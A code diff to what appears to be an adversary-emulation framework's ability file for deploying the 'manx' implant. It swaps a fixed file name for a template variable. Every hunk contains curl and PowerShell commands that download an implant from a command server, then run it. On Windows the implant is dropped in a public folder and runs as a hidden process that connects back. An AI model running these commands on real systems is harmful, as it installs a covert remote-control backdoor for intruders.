@@ -14,18 +14,18 @@
           server="#{app.contact.http}";
           socket="#{app.contact.tcp}";
           contact="tcp";
-          curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > manx.go;
-          chmod +x manx.go;
-          ./manx.go -http $server -socket $socket -contact $contact -v
+          curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
         variations:
           - description: Run against the UDP contact
             command: |
               server="#{app.contact.http}";
               socket="#{app.contact.udp}";
               contact="udp";
-              curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > manx.go;
-              chmod +x manx.go;
-              ./manx.go -http $server -socket $socket -contact $contact -v
+              curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
           - description: Download with a random name and start as a background process
             command: |
               server="#{app.contact.http}";
@@ -39,9 +39,9 @@
           server="#{app.contact.http}";
           socket="#{app.contact.tcp}";
           contact="tcp";
-          curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > manx.go;
-          chmod +x manx.go;
-          ./manx.go -http $server -socket $socket -contact $contact -v
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
         variations:
           - description: Run against the UDP contact
             command: |
@@ -69,11 +69,10 @@
           $wc.Headers.add("platform","windows");
           $wc.Headers.add("file","manx.go");
           $data=$wc.DownloadData($url);
-          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-          Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
-          rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
-          ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
-          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
+          Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+          rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
+          ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
+          Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
         variations:
           - description: Run against the UDP contact
             command: |
@@ -86,8 +85,7 @@
               $wc.Headers.add("platform","windows");
               $wc.Headers.add("file","manx.go");
               $data=$wc.DownloadData($url);
-              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-              Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
-              rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
-              ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
-              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
+              Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
+              ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
